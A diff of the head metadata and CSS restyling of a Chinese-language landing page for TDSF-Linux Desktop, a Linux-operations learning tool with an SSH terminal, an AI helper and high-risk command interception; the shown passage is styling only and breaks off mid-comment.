@@ -6,457 +6,1144 @@
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
 <meta http-equiv="Pragma" content="no-cache">
 <meta http-equiv="Expires" content="0">
-<title>TDSF-Linux Desktop — 面向 Linux 初学者的桌面运维工作台</title>
-<meta name="description" content="SSH 终端 + 可见执行的 AI + 高危命令拦截 + 可信决策留痕，一台桌面机完成的 Linux 运维学习环境。">
-<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%233b82f6'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' font-weight='700' fill='white' text-anchor='middle'%3E%3E_%3C/text%3E%3C/svg%3E">
+<title>TDSF-Linux Desktop — 让第一次连上 Linux 服务器的人敢敲下一条命令</title>
+<meta name="description" content="SSH 终端 + 可见执行的 AI + 高危命令拦截 + 决策留痕，一台桌面机完成的 Linux 运维学习环境。每个数字都有复现命令。">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#070a0e">
+<meta property="og:title" content="TDSF-Linux Desktop">
+<meta property="og:description" content="SSH 终端、AI 辅助、高危命令拦截放在同一个窗口。拦截发生在按下回车之前。">
+<meta property="og:image" content="https://harryopo.github.io/tdsf-linux-desktop/assets/shot-workbench.png">
+<meta property="og:type" content="website">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%230f6cbd'/%3E%3Cpath d='M9 12l4 4-4 4M16 20h7' stroke='white' stroke-width='2' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
 <style>
+  /* 蓝一律取自应用自己的令牌：--blue = 浅色主题主操作底，--blue-ink / --blue-hi = 深底上的蓝文字与悬停。
+     字族两档：无衬线 UI + 等宽读数，中文黑体排在 monospace 之前，避免中文掉进宋体。 */
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   :root {
-    --bg: #0d1014;
-    --bg-2: #12161c;
-    --panel: #171c23;
-    --line: #262d36;
-    --ink: #e6ebf0;
-    --ink-2: #9aa6b2;
-    --ink-3: #6b7684;
-    --accent: #3b82f6;
-    --accent-soft: rgba(59, 130, 246, 0.12);
-    --ok: #34d399;
-    --warn: #fbbf24;
-    --danger: #f87171;
-    --mono: "JetBrains Mono", "Cascadia Code", Consolas, "Microsoft YaHei Mono", monospace;
-    --sans: system-ui, -apple-system, "Segoe UI", "Microsoft YaHei", "PingFang SC", sans-serif;
+    --field: #070a0e;
+    --field-2: #0b1015;
+    --panel: #111820;
+    --rule: #1b242e;
+    --rule-2: #293541;
+    --ink: #e8eef5;
+    --ink-2: #b0becd;
+    --ink-3: #8496a8;
+    --blue: #0f6cbd;
+    --blue-ink: #6aa9e8;
+    --blue-hi: #8ac0f2;
+    --warn-ink: #ffb54d;
+    --err-ink: #ff8a80;
+    --ok-ink: #7ee081;
+    --on-accent: #ffffff;
+    --r-inline: 6px;
+    --r-control: 10px;
+    --r-card: 14px;
+    --r-panel: 18px;
+    --pill: 999px;
+    --dur-fast: 150ms;
+    --dur-mid: 240ms;
+    --dur-slow: 420ms;
+    --ease: cubic-bezier(0.22, 0.61, 0.36, 1);
+    --sans: 'Inter', system-ui, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    --mono: 'JetBrains Mono', 'Cascadia Code', Consolas, 'Microsoft YaHei', monospace;
+    --gutter: clamp(20px, 5vw, 72px);
+    --maxw: 1240px;
   }
+  html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
   body {
-    background: var(--bg);
+    background: var(--field);
     color: var(--ink);
     font-family: var(--sans);
+    font-size: 17px;
     line-height: 1.75;
     -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
   }
-  a { color: var(--accent); text-decoration: none; }
-  a:hover { text-decoration: underline; }
+  ::selection { background: var(--blue); color: var(--on-accent); }
+  a { color: var(--blue-ink); text-decoration: none; }
+  a:hover { color: var(--blue-hi); }
+  :focus-visible { outline: 2px solid var(--blue-hi); outline-offset: 3px; border-radius: var(--r-inline); }
+  img { max-width: 100%; display: block; }
+  button { font: inherit; color: inherit; background: none; border: none; cursor: pointer; }
 
-  .wrap { max-width: 1080px; margin: 0 auto; padding: 0 24px; }
+  .shell { width: 100%; max-width: var(--maxw); margin-inline: auto; padding-inline: var(--gutter); }
+  .mono { font-family: var(--mono); font-variant-ligatures: none; }
+  .num { font-family: var(--mono); font-feature-settings: 'tnum'; letter-spacing: -0.01em; }
 
   /* ---------- 顶栏 ---------- */
-  header.top {
-    position: sticky; top: 0; z-index: 20;
-    background: rgba(13, 16, 20, 0.92);
-    border-bottom: 1px solid var(--line);
-    backdrop-filter: blur(8px);
+  .bar {
+    position: fixed; inset: 0 0 auto 0; height: 2px; z-index: 40;
+    background: var(--blue); transform: scaleX(0); transform-origin: 0 50%;
   }
-  .top-inner { display: flex; align-items: center; gap: 20px; height: 56px; }
-  .brand { font-family: var(--mono); font-weight: 600; font-size: 0.95rem; letter-spacing: 0.02em; }
-  .brand span { color: var(--accent); }
-  .top nav { margin-left: auto; display: flex; gap: 18px; font-size: 0.86rem; }
-  .top nav a { color: var(--ink-2); }
-  .top nav a:hover { color: var(--ink); text-decoration: none; }
+  header.nav {
+    position: sticky; top: 0; z-index: 30;
+    background: color-mix(in srgb, var(--field) 94%, transparent);
+    border-bottom: 1px solid var(--rule);
+  }
+  .nav-in { display: flex; align-items: center; gap: 24px; height: 60px; }
+  .mark { display: flex; align-items: center; gap: 9px; font-family: var(--mono); font-size: 13px; letter-spacing: 0.04em; color: var(--ink); }
+  .mark svg { flex: none; }
+  .mark b { font-weight: 600; }
+  .nav-links { margin-left: auto; display: flex; gap: 4px; overflow-x: auto; scrollbar-width: none; }
+  .nav-links::-webkit-scrollbar { display: none; }
+  .nav-links a {
+    flex: none; padding: 6px 11px; border-radius: var(--r-control);
+    font-size: 14px; color: var(--ink-3); transition: color var(--dur-fast) var(--ease), background var(--dur-fast) var(--ease);
+  }
+  .nav-links a:hover { color: var(--ink); background: var(--panel); }
+  .nav-links a[aria-current="true"] { color: var(--blue-ink); }
 
   /* ---------- Hero ---------- */
-  .hero { padding: 72px 0 40px; }
-  .kicker { font-family: var(--mono); font-size: 0.8rem; color: var(--accent); letter-spacing: 0.06em; }
+  .hero { position: relative; padding: clamp(44px, 8vh, 92px) 0 clamp(56px, 9vh, 110px); overflow: clip; }
+  .hero-glow {
+    position: absolute; inset: -18% 0 auto 0; height: 132%; z-index: 0; pointer-events: none;
+    background:
+      radial-gradient(44% 50% at 79% 33%, color-mix(in srgb, var(--blue) 24%, transparent) 0%, transparent 70%),
+      radial-gradient(36% 42% at 6% 6%, color-mix(in srgb, var(--blue) 11%, transparent) 0%, transparent 72%);
+  }
+  .hero-in { position: relative; z-index: 2; display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1.08fr); gap: clamp(28px, 4vw, 64px); align-items: center; }
+  .hero-live {
+    display: inline-flex; align-items: center; gap: 9px;
+    font-family: var(--mono); font-size: 12.5px; color: var(--ink-3);
+    padding: 5px 12px 5px 9px; border: 1px solid var(--rule); border-radius: var(--pill);
+  }
+  .live-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--blue-ink); box-shadow: 0 0 0 0 color-mix(in srgb, var(--blue-ink) 60%, transparent); }
   h1 {
-    font-size: clamp(2rem, 5.2vw, 3.1rem);
-    line-height: 1.18; letter-spacing: -0.022em; font-weight: 700;
-    margin: 14px 0 18px; text-wrap: balance;
+    margin: 22px 0 18px;
+    font-size: clamp(1.85rem, 1.1rem + 2.9vw, 3.1rem);
+    line-height: 1.16; letter-spacing: -0.025em; font-weight: 700;
   }
-  .lede { font-size: 1.08rem; color: var(--ink-2); max-width: 62ch; }
-  .chips { display: flex; flex-wrap: wrap; gap: 8px; margin: 26px 0 34px; }
-  .chip {
-    font-family: var(--mono); font-size: 0.78rem; color: var(--ink-2);
-    border: 1px solid var(--line); border-radius: 999px; padding: 5px 12px;
-    background: var(--bg-2);
+  /* 中英混排的中文可以逐字断行，不锁行就会把"服务器"切成"服/务器"。
+     把语义段锁成不可断的整体，让它整段换行，断点就只剩我们能预测的那两处。 */
+  h1 .seg { white-space: nowrap; }
+  h1 em { font-style: normal; color: var(--blue-ink); }
+  .lede { font-size: clamp(1rem, 0.95rem + 0.3vw, 1.15rem); color: var(--ink-2); max-width: 46ch; }
+  .cta { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 30px; }
+  .btn {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 11px 18px; border-radius: var(--r-control);
+    font-size: 15px; font-weight: 600; letter-spacing: -0.01em;
+    transition: transform var(--dur-fast) var(--ease), background var(--dur-fast) var(--ease), border-color var(--dur-fast) var(--ease), color var(--dur-fast) var(--ease);
   }
-  .chip b { color: var(--ink); font-weight: 600; }
-  .hero-shot {
-    border: 1px solid var(--line); border-radius: 12px; overflow: hidden;
-    background: #000; box-shadow: 0 18px 50px rgba(0, 0, 0, 0.55);
+  .btn-solid { background: var(--blue); color: var(--on-accent); }
+  .btn-solid:hover { background: #0d5ea6; color: var(--on-accent); transform: translateY(-1px); }
+  .btn-ghost { border: 1px solid var(--rule-2); color: var(--ink); }
+  .btn-ghost:hover { border-color: var(--blue-ink); color: var(--blue-hi); transform: translateY(-1px); }
+  .btn:active { transform: translateY(0); }
+  .stack-line {
+    margin-top: 26px; padding-top: 20px; border-top: 1px solid var(--rule);
+    font-family: var(--mono); font-size: 12.5px; color: var(--ink-3); line-height: 2;
   }
-  .hero-shot img { display: block; width: 100%; }
+  .stack-line b { color: var(--ink-2); font-weight: 500; }
+
+  /* ---------- 终端面板 ---------- */
+  .term {
+    background: #0a0e13; border-radius: var(--r-panel);
+    box-shadow: 0 24px 56px rgba(0, 0, 0, 0.55);
+    overflow: hidden;
+  }
+  .term-top {
+    display: flex; align-items: center; gap: 6px 12px; flex-wrap: wrap; padding: 11px 16px;
+    border-bottom: 1px solid var(--rule); background: var(--field-2);
+    font-family: var(--mono); font-size: 12px; color: var(--ink-3);
+  }
+  .term-top span { white-space: nowrap; }
+  .term-top .tab { color: var(--ink); padding: 3px 9px; border-radius: var(--r-inline); background: var(--panel); }
+  .term-top .grow { margin-left: auto; }
+  .term-body {
+    padding: 18px 18px 8px; min-height: 252px;
+    font-family: var(--mono); font-size: 13.5px; line-height: 1.85;
+  }
+  .tl { display: grid; grid-template-columns: auto 1fr; gap: 10px; align-items: start; }
+  .tl .ps { color: var(--blue-ink); }
+  .tl .cmd { color: var(--ink); word-break: break-all; }
+  .tl .cursor { display: inline-block; width: 8px; height: 1.05em; vertical-align: -2px; background: var(--blue-hi); }
+  .verdict {
+    margin: 2px 0 12px 24px; padding: 8px 12px; border: 1px solid var(--rule); border-radius: var(--r-control);
+    background: var(--panel); font-size: 13px; line-height: 1.6;
+    display: flex; align-items: baseline; gap: 10px; flex-wrap: wrap;
+  }
+  .lv { flex: none; font-family: var(--mono); font-size: 12px; letter-spacing: 0.04em; padding: 2px 8px; border-radius: var(--pill); }
+  .lv-block { background: color-mix(in srgb, var(--err-ink) 14%, transparent); color: var(--err-ink); }
+  .lv-low { background: color-mix(in srgb, var(--blue-ink) 14%, transparent); color: var(--blue-ink); }
+  .verdict .why { color: var(--ink-2); }
+  .verdict .src { color: var(--ink-3); font-family: var(--mono); font-size: 12px; }
+  .term-foot {
+    display: flex; align-items: center; gap: 14px; flex-wrap: wrap;
+    padding: 9px 16px; border-top: 1px solid var(--rule); background: var(--field-2);
+    font-family: var(--mono); font-size: 12px; color: var(--ink-3);
+  }
+  .term-foot .k { color: var(--ink-2); }
+  .term-foot button { margin-left: auto; font-family: var(--mono); font-size: 12px; color: var(--blue-ink); border: 1px solid var(--rule-2); border-radius: var(--r-control); padding: 4px 11px; }
+  .term-foot button:hover { color: var(--blue-hi); border-color: var(--blue-ink); }
+  .term-cap { margin-top: 14px; font-size: 13px; color: var(--ink-3); max-width: 62ch; }
+  .term-cap b { color: var(--ink-2); font-weight: 500; }
+
+  /* ---------- 会话拓扑带 ---------- */
+  .topo { padding: 0; }
+  .topo-stage { position: relative; height: clamp(240px, 34vh, 380px); background: #05080b; }
+  .topo-stage canvas { position: absolute; inset: 0; width: 100%; height: 100%; display: block; }
+  .topo-cap { display: grid; gap: 14px; padding: 22px 0 clamp(46px, 7vw, 82px); }
+  .topo-cap p { color: var(--ink-2); max-width: 74ch; font-size: 15.5px; }
+  .topo-cap b { color: var(--ink); font-weight: 600; }
+  .topo-legend { display: flex; flex-wrap: wrap; gap: 8px 22px; font-family: var(--mono); font-size: 12px; color: var(--ink-3); }
+  .topo-legend span { display: inline-flex; align-items: center; gap: 8px; }
+  .lg { width: 9px; height: 9px; border-radius: 50%; flex: none; }
+  .lg-hub { background: var(--blue-ink); box-shadow: 0 0 9px color-mix(in srgb, var(--blue-ink) 70%, transparent); }
+  .lg-node { background: color-mix(in srgb, var(--blue-ink) 52%, transparent); }
+  .lg-pkt { background: var(--blue-hi); }
+  .lg-block { background: var(--warn-ink); box-shadow: 0 0 9px color-mix(in srgb, var(--warn-ink) 60%, transparent); }
 
   /* ---------- 通用节 ---------- */
-  section { padding: 56px 0; border-top: 1px solid var(--line); }
-  h2 { font-size: 1.5rem; letter-spacing: -0.012em; margin-bottom: 10px; }
-  .sec-note { color: var(--ink-2); max-width: 68ch; margin-bottom: 30px; }
-  h3 { font-size: 1.02rem; margin-bottom: 6px; }
+  section { padding: clamp(58px, 9vw, 112px) 0; position: relative; }
+  section + section { border-top: 1px solid var(--rule); }
+  .band { background: var(--field-2); }
+  .h2 {
+    font-size: clamp(1.5rem, 1.05rem + 1.5vw, 2.15rem); line-height: 1.25;
+    letter-spacing: -0.02em; font-weight: 700; text-wrap: balance;
+  }
+  .sec-lede { margin-top: 14px; color: var(--ink-2); max-width: 64ch; font-size: 1.03rem; }
+  .head-row { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 260px); gap: 32px; align-items: end; margin-bottom: clamp(30px, 4vw, 54px); }
+  .head-row .idx { font-family: var(--mono); font-size: 12px; color: var(--ink-3); text-align: right; line-height: 1.6; }
 
-  /* ---------- 能力卡 ---------- */
-  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(310px, 1fr)); gap: 14px; }
-  .feat {
-    background: var(--panel); border: 1px solid var(--line); border-radius: 10px;
-    padding: 20px 20px 18px;
+  /* ---------- 为什么：对照 ---------- */
+  .versus { display: grid; grid-template-columns: minmax(0, 1fr) 1px minmax(0, 1fr); gap: clamp(24px, 3vw, 44px); }
+  .vline { border-left: 1px solid var(--rule); }
+  .v-col { padding: 6px 0; }
+  .v-title { font-family: var(--mono); font-size: 12.5px; letter-spacing: 0.05em; color: var(--ink-3); margin-bottom: 18px; }
+  .v-col p { color: var(--ink-2); font-size: 15.5px; margin-bottom: 14px; }
+  .v-col.ok p { color: var(--ink); }
+  .frag {
+    font-family: var(--mono); font-size: 13.5px; color: var(--ink-2);
+    padding: 10px 13px; border: 1px solid var(--rule); border-radius: var(--r-control); background: #0a0e13; margin-bottom: 10px;
   }
-  .feat:hover { border-color: #33404e; }
-  .feat .tag { font-family: var(--mono); font-size: 0.72rem; color: var(--accent); letter-spacing: 0.04em; }
-  .feat p { color: var(--ink-2); font-size: 0.93rem; margin-top: 6px; }
-  .feat ul { margin: 10px 0 0 16px; color: var(--ink-2); font-size: 0.9rem; }
-  .feat li { margin: 3px 0; }
+  .frag span { color: var(--err-ink); }
 
-  /* ---------- 截图 ---------- */
-  .shot { margin-bottom: 30px; }
-  .shot-frame {
-    border: 1px solid var(--line); border-radius: 10px; overflow: hidden; background: #000;
+  /* ---------- 能力索引：细线行，不做卡片矩阵 ---------- */
+  .index { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 0 clamp(32px, 5vw, 72px); }
+  .row {
+    display: grid; grid-template-columns: 74px minmax(0, 1fr); gap: 16px;
+    padding: 18px 0; border-bottom: 1px solid var(--rule);
   }
-  .shot-frame img { display: block; width: 100%; }
-  .shot figcaption {
-    font-family: var(--mono); font-size: 0.8rem; color: var(--ink-3); margin-top: 9px;
+  .row:nth-last-child(-n+2) { border-bottom: none; }
+  .row .key { font-family: var(--mono); font-size: 12px; color: var(--ink-3); padding-top: 4px; }
+  .row h3 { font-size: 16.5px; font-weight: 600; letter-spacing: -0.01em; }
+  .row p { color: var(--ink-2); font-size: 14.5px; line-height: 1.7; margin-top: 3px; }
+  .row:hover .key { color: var(--blue-ink); }
+  .row:hover h3 { color: var(--blue-hi); }
+  .row h3, .row .key { transition: color var(--dur-fast) var(--ease); }
+
+  /* ---------- 风险闸演示 ---------- */
+  .guard { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1.05fr); gap: clamp(24px, 4vw, 56px); align-items: start; }
+  .chips { display: flex; flex-wrap: wrap; gap: 9px; margin-bottom: 22px; }
+  .chip {
+    font-family: var(--mono); font-size: 13px; padding: 7px 13px;
+    border: 1px solid var(--rule-2); border-radius: var(--r-control); color: var(--ink-2); background: var(--field);
+    transition: border-color var(--dur-fast) var(--ease), color var(--dur-fast) var(--ease), transform var(--dur-fast) var(--ease);
   }
-  .shot figcaption b { color: var(--ink-2); font-weight: 500; }
+  .chip:hover { border-color: var(--blue-ink); color: var(--blue-hi); transform: translateY(-1px); }
+  .chip[aria-pressed="true"] { background: var(--blue); border-color: var(--blue); color: var(--on-accent); }
+  .readout {
+    border: 1px solid var(--rule); border-radius: var(--r-panel); background: var(--panel);
+    padding: clamp(18px, 2.4vw, 26px); min-height: 240px;
+  }
+  .readout .cmd-line { font-family: var(--mono); font-size: 15px; color: var(--ink); word-break: break-all; }
+  .readout .verdict-big { display: flex; align-items: center; gap: 12px; margin: 18px 0 10px; flex-wrap: wrap; }
+  .readout .lv { font-size: 13px; padding: 5px 13px; }
+  .lv-high { background: color-mix(in srgb, var(--warn-ink) 15%, transparent); color: var(--warn-ink); }
+  .lv-medium { background: color-mix(in srgb, var(--blue-hi) 14%, transparent); color: var(--blue-hi); }
+  .readout .reason { font-size: 16px; color: var(--ink); font-weight: 600; letter-spacing: -0.01em; }
+  .readout .meta { margin-top: 16px; padding-top: 14px; border-top: 1px solid var(--rule); font-size: 13.5px; color: var(--ink-2); }
+  .readout .meta .k { font-family: var(--mono); font-size: 12px; color: var(--ink-3); display: block; margin-bottom: 3px; }
+  .rulecount { display: flex; flex-wrap: wrap; gap: 10px 26px; margin-top: 24px; }
+  .rulecount div { font-family: var(--mono); font-size: 12.5px; color: var(--ink-3); }
+  .rulecount b { color: var(--ink); font-weight: 600; font-size: 15px; }
+
+  /* ---------- 界面切片 ---------- */
+  .plates { display: grid; gap: clamp(40px, 6vw, 84px); }
+  .plate-btn { display: block; width: 100%; text-align: left; }
+  .plate-frame {
+    border-radius: var(--r-panel); overflow: hidden; background: #05080b;
+    box-shadow: 0 24px 56px rgba(0, 0, 0, 0.5);
+    transition: transform var(--dur-mid) var(--ease);
+  }
+  .plate-btn:hover .plate-frame { transform: translateY(-3px); }
+  .plate-frame img { width: 100%; }
+  .plate-cap { display: flex; align-items: baseline; gap: 14px; margin-top: 16px; flex-wrap: wrap; }
+  .plate-cap h3 { font-size: 17px; font-weight: 600; }
+  .plate-cap p { color: var(--ink-2); font-size: 14.5px; flex: 1 1 320px; min-width: 0; }
+  .plate-cap .zoom { font-family: var(--mono); font-size: 12px; color: var(--ink-3); border: 1px solid var(--rule); border-radius: var(--r-inline); padding: 2px 8px; }
+  dialog.lightbox {
+    width: min(1180px, 94vw); max-height: 92vh; padding: 0; border: 1px solid var(--rule-2);
+    border-radius: var(--r-panel); background: var(--field-2); color: var(--ink);
+  }
+  dialog.lightbox::backdrop { background: rgba(3, 5, 7, 0.86); }
+  .lb-in { display: flex; flex-direction: column; max-height: 92vh; }
+  .lb-top { display: flex; align-items: center; gap: 12px; padding: 12px 16px; border-bottom: 1px solid var(--rule); font-family: var(--mono); font-size: 12px; color: var(--ink-3); }
+  .lb-top button { margin-left: auto; font-family: var(--mono); font-size: 12px; color: var(--ink); border: 1px solid var(--rule-2); border-radius: var(--r-control); padding: 4px 12px; }
+  .lb-top button:hover { color: var(--blue-hi); border-color: var(--blue-ink); }
+  .lb-img { overflow: auto; padding: 14px; }
+  .lb-img img { width: 100%; }
 
   /* ---------- 架构 ---------- */
-  .arch { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 12px; margin-top: 8px; }
-  .proc {
-    border: 1px solid var(--line); border-radius: 10px; padding: 18px; background: var(--bg-2);
+  .arch-stack { display: grid; gap: 12px; }
+  .procs { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
+  .proc { border: 1px solid var(--rule); border-radius: var(--r-card); background: var(--panel); padding: 17px 19px; }
+  .proc .role { font-family: var(--mono); font-size: 12px; letter-spacing: 0.04em; color: var(--ink-3); }
+  .proc h3 { margin: 5px 0 7px; font-size: 16.5px; font-weight: 600; letter-spacing: -0.01em; }
+  .proc p { font-size: 14px; color: var(--ink-2); line-height: 1.65; }
+  .trunk { display: block; width: 100%; height: 34px; margin: 14px 0 6px; }
+  .trunk .t-edge { stroke: var(--rule-2); stroke-width: 1.5; fill: none; }
+  .trunk .t-fwd { stroke: var(--blue-ink); stroke-width: 2; fill: none; stroke-dasharray: 5 9; stroke-linecap: round; }
+  .trunk .t-back { stroke: var(--ok-ink); stroke-width: 2; fill: none; stroke-dasharray: 4 10; stroke-linecap: round; }
+  .trunk-cap { display: flex; flex-wrap: wrap; gap: 6px 20px; font-family: var(--mono); font-size: 12px; color: var(--ink-3); }
+  .trunk-cap b { color: var(--ink-2); font-weight: 500; }
+  .arch-lower { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 12px; align-items: start; }
+  .funnel { border: 1px solid var(--rule); border-radius: var(--r-card); background: var(--field); padding: 16px 19px; }
+  .funnel h3 { font-size: 15.5px; font-weight: 600; }
+  .funnel p { margin-top: 5px; font-family: var(--mono); font-size: 12.5px; color: var(--ink-3); line-height: 1.75; }
+  .sandbox {
+    border: 1px solid var(--rule); border-radius: var(--r-card); background: var(--panel); padding: 20px 22px;
   }
-  .proc .role { font-family: var(--mono); font-size: 0.75rem; color: var(--ink-3); }
-  .proc h3 { margin: 4px 0 8px; font-family: var(--mono); font-size: 0.98rem; }
-  .proc p { font-size: 0.89rem; color: var(--ink-2); }
-  .rule {
-    margin-top: 22px; padding: 16px 18px; border: 1px dashed #2f3a45; border-radius: 10px;
-    background: var(--accent-soft); font-size: 0.92rem; color: var(--ink);
-  }
-  .rule b { color: var(--accent); }
+  .sandbox h3 { font-size: 15px; font-weight: 600; margin-bottom: 10px; }
+  .sandbox ul { list-style: none; display: grid; gap: 8px; }
+  .sandbox li { font-family: var(--mono); font-size: 12.5px; color: var(--ink-2); display: flex; gap: 9px; align-items: baseline; }
+  .sandbox li svg { flex: none; transform: translateY(2px); }
+  .sandbox p { margin-top: 14px; font-size: 13.5px; color: var(--ink-3); }
 
-  /* ---------- 流程 ---------- */
-  .flow { display: grid; gap: 10px; counter-reset: step; }
-  .step {
-    display: grid; grid-template-columns: 34px 1fr; gap: 14px; align-items: start;
-    background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 16px 18px;
-  }
-  .step::before {
-    counter-increment: step; content: counter(step);
-    font-family: var(--mono); font-size: 0.85rem; color: var(--accent);
-    border: 1px solid #2b3a4d; border-radius: 7px; width: 34px; height: 34px;
-    display: grid; place-items: center; background: var(--bg-2);
-  }
-  .step h3 { font-size: 0.98rem; }
-  .step p { font-size: 0.9rem; color: var(--ink-2); margin-top: 2px; }
+  /* ---------- 链路 ---------- */
+  .rail { position: relative; padding-top: 6px; }
+  .rail-line { position: absolute; left: 0; right: 0; top: 34px; height: 1px; background: var(--rule); }
+  .rail-fill { position: absolute; left: 0; top: 34px; height: 1px; background: var(--blue-ink); width: 100%; transform: scaleX(0); transform-origin: 0 50%; }
+  .steps { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: clamp(16px, 2.4vw, 34px); position: relative; }
+  .step-1 { padding-top: 0; }
+  .node { width: 56px; height: 56px; border-radius: 50%; background: var(--field); border: 1px solid var(--rule-2); display: grid; place-items: center; font-family: var(--mono); font-size: 14px; color: var(--ink-3); }
+  .step.on .node { border-color: var(--blue); color: var(--blue-hi); background: color-mix(in srgb, var(--blue) 12%, var(--field)); }
+  .step h3 { margin: 18px 0 6px; font-size: 17px; font-weight: 600; letter-spacing: -0.01em; }
+  .step p { font-size: 14.5px; color: var(--ink-2); line-height: 1.7; }
 
-  /* ---------- 表格 ---------- */
-  table { width: 100%; border-collapse: collapse; font-size: 0.92rem; }
-  th, td { text-align: left; padding: 11px 14px; border-bottom: 1px solid var(--line); }
-  th { color: var(--ink-3); font-weight: 500; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.05em; }
-  td:first-child { font-family: var(--mono); font-size: 0.86rem; color: var(--ink); white-space: nowrap; }
-  td:last-child { color: var(--ink-2); }
-  tbody tr:hover { background: var(--bg-2); }
+  /* ---------- 表 ---------- */
+  .tbl { width: 100%; border-collapse: collapse; }
+  .tbl th, .tbl td { text-align: left; padding: 13px 16px 13px 0; border-bottom: 1px solid var(--rule); vertical-align: baseline; }
+  .tbl thead th { font-family: var(--mono); font-size: 12px; letter-spacing: 0.05em; color: var(--ink-3); font-weight: 400; padding-bottom: 9px; }
+  .tbl tbody tr:last-child td { border-bottom: none; }
+  .tbl td.k { font-weight: 600; white-space: nowrap; }
+  .tbl td.v { font-family: var(--mono); font-size: 14.5px; color: var(--blue-ink); white-space: nowrap; }
+  .tbl td.c { font-family: var(--mono); font-size: 12px; color: var(--ink-2); word-break: break-all; }
+  .tbl td .note { color: var(--ink-3); }
+  .tbl tbody tr { transition: background var(--dur-fast) var(--ease); }
+  .tbl tbody tr:hover { background: var(--panel); }
 
-  /* ---------- 数字 ---------- */
-  .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 26px; }
-  .stat { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 18px 20px; }
-  .stat .n { font-family: var(--mono); font-size: 1.7rem; color: var(--ink); letter-spacing: -0.02em; }
-  .stat .l { font-size: 0.85rem; color: var(--ink-2); margin-top: 2px; }
-  .gates { display: flex; flex-wrap: wrap; gap: 8px; }
-  .gate {
-    font-family: var(--mono); font-size: 0.78rem; color: var(--ink-2);
-    background: var(--bg-2); border: 1px solid var(--line); border-radius: 7px; padding: 6px 10px;
-  }
-  .gate::before { content: "✓ "; color: var(--ok); }
+  /* ---------- 门禁清单 ---------- */
+  .gates { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 2px 34px; margin-top: 8px; }
+  .gates li { list-style: none; display: flex; gap: 11px; align-items: baseline; padding: 8px 0; border-bottom: 1px solid var(--rule); font-size: 14.5px; color: var(--ink-2); }
+  .gates svg { flex: none; transform: translateY(3px); }
 
   /* ---------- 边界 ---------- */
-  .honest { background: var(--bg-2); border: 1px solid var(--line); border-left: 3px solid var(--warn); border-radius: 8px; padding: 18px 20px; }
-  .honest ul { margin: 6px 0 0 18px; color: var(--ink-2); font-size: 0.92rem; }
-  .honest li { margin: 5px 0; }
+  .honest { border: 1px solid var(--rule); border-radius: var(--r-panel); background: var(--panel); padding: clamp(22px, 3vw, 34px); }
+  .honest ul { list-style: none; display: grid; gap: 14px; }
+  .honest li { display: grid; grid-template-columns: auto 1fr; gap: 14px; color: var(--ink-2); font-size: 15px; }
+  .honest li .mk { font-family: var(--mono); font-size: 12px; color: var(--warn-ink); padding-top: 3px; }
 
-  footer {
-    border-top: 1px solid var(--line); padding: 34px 0 54px;
-    color: var(--ink-3); font-size: 0.85rem;
-  }
-  footer .links { display: flex; flex-wrap: wrap; gap: 18px; margin-bottom: 10px; }
+  /* ---------- 页脚 ---------- */
+  footer { border-top: 1px solid var(--rule); padding: clamp(40px, 6vw, 66px) 0; background: var(--field-2); }
+  .foot-grid { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 32px; align-items: start; }
+  .foot-links { display: flex; flex-wrap: wrap; gap: 10px 18px; margin-bottom: 18px; }
+  .foot-links a { font-size: 15px; }
+  .foot-meta { font-family: var(--mono); font-size: 12px; color: var(--ink-3); line-height: 2; }
 
+  /* ---------- 进场 ----------
+     用 CSS 滚动时间线，不靠 JS 加类：浏览器不支持就整条规则不生效，内容始终是可见默认态。
+     这样"脚本出错/被打断导致整页 opacity:0"这类失败模式根本没有载体。 */
   @media (prefers-reduced-motion: no-preference) {
-    .feat, .stat, .shot-frame { transition: border-color 0.18s ease, transform 0.18s ease; }
+    .live-dot { animation: ping 2.4s var(--ease) infinite; }
+    .trunk .t-fwd { animation: dash 2.6s linear infinite; }
+    .trunk .t-back { animation: dash 3.4s linear infinite reverse; }
+    .cursor { animation: blink 1.05s steps(2, start) infinite; }
+    @keyframes ping { 0%, 70%, 100% { box-shadow: 0 0 0 0 color-mix(in srgb, var(--blue-ink) 55%, transparent); } 35% { box-shadow: 0 0 0 7px transparent; } }
+    @keyframes dash { to { stroke-dashoffset: -56; } }
+    @keyframes blink { 50% { opacity: 0; } }
   }
-  @media (max-width: 640px) {
-    .top nav { display: none; }
-    .hero { padding-top: 46px; }
-    section { padding: 42px 0; }
+  /* 进场只动 transform，不动 opacity：
+     隐藏态一旦由动画负责，任何"动画没跑到/没重算"的渲染路径都会把整块内容读不到（无头截图已经演出来一次）。
